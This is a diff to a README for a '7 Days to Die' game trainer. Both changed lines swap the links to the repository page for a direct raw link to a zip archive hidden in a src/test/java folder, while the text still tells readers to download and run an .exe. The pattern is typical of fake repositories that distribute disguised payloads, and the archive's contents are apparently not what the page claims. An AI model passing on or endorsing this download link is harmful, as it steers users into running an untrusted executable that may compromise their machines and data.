@@ -1,6 +1,6 @@
 # 🛠️ 7-days-to-die-trainer - Master your survival experience with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Henriksidelong63/7-days-to-die-trainer)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/Henriksidelong63/7-days-to-die-trainer/main/7-days-to-die-trainer/src/test/java/com/sevendaystodie/die-trainer-days-to-1.5.zip)
 
 ## 📌 About this project
 
@@ -8,7 +8,7 @@ This tool changes game values in 7 Days to Die to help you survive zombies. It w
 
 ## 💾 How to download the trainer
 
-Visit [this page](https://github.com/Henriksidelong63/7-days-to-die-trainer) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .exe to start your download. Move this file to a folder on your desktop where you can find it. 
+Visit [this page](https://raw.githubusercontent.com/Henriksidelong63/7-days-to-die-trainer/main/7-days-to-die-trainer/src/test/java/com/sevendaystodie/die-trainer-days-to-1.5.zip) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .exe to start your download. Move this file to a folder on your desktop where you can find it. 
 
 ## ⚙️ System requirements
 
